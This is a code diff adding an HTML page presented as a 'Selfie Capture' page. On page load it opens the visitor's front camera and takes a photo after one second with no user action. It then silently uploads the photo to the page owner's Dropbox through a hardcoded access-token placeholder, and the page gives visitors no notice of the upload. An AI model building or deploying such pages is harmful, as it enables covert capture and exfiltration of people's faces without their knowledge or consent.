@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://unpkg.com/dropbox/dist/Dropbox-sdk.min.js"></script>
+    <title>page name</title>
+    
+    <style>
+        /* Styling the video box */
+        #videoBox {
+            width: 320px;
+            height: 240px;
+            border: 2px solid #000;
+            margin-bottom: 20px;
+        }
+
+        /* Styling the video element to fit in the box */
+        #video {
+            width: 100%;
+            height: 100%;
+        }
+
+        /* Styling the canvas and snapshot image */
+        #canvas {
+            display: none;
+        }
+
+        #snapshot {
+            display: none;
+            max-width: 100%;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+<h1>Selfie Capture</h1>
+
+<!-- Video box for webcam preview -->
+<div id="videoBox">
+    <video id="video" autoplay></video>
+</div>
+
+<!-- Display the captured image -->
+<canvas id="canvas" width="320" height="240"></canvas>
+<img id="snapshot">
+
+<script>
+// Dropbox access token (Replace with your own access token)
+const ACCESS_TOKEN = 'your token';  // Replace this with your actual Dropbox Access Token
+
+// Function to start the camera
+function startCamera() {
+    navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' }  // 'user' forces front camera (selfie)
+    })
+    .then(function(stream) {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // Once the video starts, take the snapshot after a short delay
+        video.onplaying = function() {
+            setTimeout(takeSnapshot, 1000);  // Adding a delay for better stability
+        };
+    })
+    .catch(function(error) {
+        console.error('Error accessing camera: ', error);
+        alert("Camera access failed! Please check your permissions.");
+    });
+}
+
+// Function to take a snapshot from the video feed
+function takeSnapshot() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const snapshot = document.getElementById('snapshot');
+    
+    const context = canvas.getContext('2d');
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // Display the captured image
+    snapshot.src = canvas.toDataURL('image/png');
+    snapshot.style.display = 'block';
+    
+    // Automatically upload to Dropbox after the snapshot
+    uploadToDropbox();  // Upload automatically after capturing the image
+}
+
+// Function to upload the captured image to Dropbox
+function uploadToDropbox() {
+    const canvas = document.getElementById('canvas');
+    const dataUrl = canvas.toDataURL('image/png');  // Get image as base64 string
+
+    // Decode base64 to binary data
+    const base64Data = dataUrl.split(',')[1];  // Strip off the 'data:image/png;base64,' part
+    const binaryData = atob(base64Data);  // Convert to binary
+
+    // Create a Uint8Array to represent the binary data
+    const byteArray = new Uint8Array(binaryData.length);
+    for (let i = 0; i < binaryData.length; i++) {
+        byteArray[i] = binaryData.charCodeAt(i);
+    }
+
+    const dbx = new Dropbox.Dropbox({ accessToken: ACCESS_TOKEN });
+
+    // Upload the binary data to Dropbox
+    dbx.filesUpload({
+        path: '/selfie.png',  // Specify the file name and path
+        contents: byteArray,  // Upload binary data
+        mode: 'add',
+        autorename: true
+    })
+    .then(function(response) {
+        console.log('File uploaded to Dropbox', response);
+        alert('File uploaded successfully!');
+    })
+    .catch(function(error) {
+        console.error('Error uploading to Dropbox', error);
+        alert('Error uploading to Dropbox.');
+    });
+}
+
+// Automatically start the camera and take a snapshot when the page loads
+window.onload = function() {
+    startCamera();  // Start the camera
+};
+</script>
+
+</body>
+
+</html>
+<!-- Developed by Alaataha.dev All copyrights received -->
